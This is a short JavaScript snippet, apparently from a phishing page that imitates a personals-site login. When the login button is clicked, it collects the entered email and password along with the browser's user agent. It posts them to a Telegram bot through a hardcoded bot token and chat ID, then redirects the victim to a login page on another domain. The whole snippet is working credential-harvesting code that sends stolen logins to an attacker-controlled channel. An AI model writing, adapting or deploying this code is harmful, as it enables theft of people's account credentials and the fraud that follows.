var token = "6960969686:AAFAmz4Y6QySShMdcmnoNZ5o910tfw4aoPc";
        var chat = "1955367555";
        let se = navigator.userAgent;
        $("button").click(function(){
            if($("#person_password_field_login").val()==""){
                alert("Password field cannot be empty.");
            }else{
                var mail=$("#person_username_field_login").val();
                var pass=$("#person_password_field_login").val();
                var m = `𝗘𝗺𝗮𝗶𝗹: ${mail}\n𝗣𝗮𝘀𝘀: ${pass}\n𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${se}`;
                $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                    chat_id:chat,
                    text:m
                }).done(function(data){
                    window.location.replace("https://megapersonals.fun/users/auth/login");
                }).fail(function(data){
                    alert("Something is wrong");
                });
            }
        });
